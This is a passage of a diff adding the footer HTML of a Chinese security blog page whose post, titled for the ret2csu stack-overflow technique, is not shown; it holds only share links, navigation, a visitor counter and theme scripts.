+  <li><a class="icon" href="http://reddit.com/submit?url=https://Mi1k7ea.github.com/2019/04/12/中级ROP之ret2csu/&title=栈溢出之ret2csu"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=https://Mi1k7ea.github.com/2019/04/12/中级ROP之ret2csu/&title=栈溢出之ret2csu"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=https://Mi1k7ea.github.com/2019/04/12/中级ROP之ret2csu/&title=栈溢出之ret2csu"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=https://Mi1k7ea.github.com/2019/04/12/中级ROP之ret2csu/&name=栈溢出之ret2csu&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="false"></i> 菜单</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="false"></i> 目录</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="false"></i> 分享</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="false"></i> 返回顶部</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy; 2019 Mi1k7ea
+  </div>
+  <span id="busuanzi_container_site_pv"> 
+    <i class="fas fa-eye"></i>
+    过客：<span id="busuanzi_value_site_uv"></span>
+  </span>
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+          <li><a href="/">H0m3</a></li>
+         
+          <li><a href="/categories/">C4teg0ri3s</a></li>
+         
+          <li><a href="/tags/">74gs</a></li>
+         
+          <li><a href="/about/">Ab0ut</a></li>
+         
+          <li><a href="https://blog.csdn.net/ski_12/">01d-b10g</a></li>
+         
+          <li><a href="/atom.xml">R55</a></li>
+        
+      </ul>
+    </nav>
+  </div>
+</footer>
+<script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    </div>
+    <!-- styles -->
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+<link rel="stylesheet" href="/lib/justified-gallery/css/justifiedGallery.min.css">
+
+    <!-- jquery -->
+<script src="/lib/jquery/jquery.min.js"></script>
+<script src="/lib/justified-gallery/js/jquery.justifiedGallery.min.js"></script>
+<script src="/js/main.js"></script>
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Disqus Comments -->
+
+
+</body>
+</html>
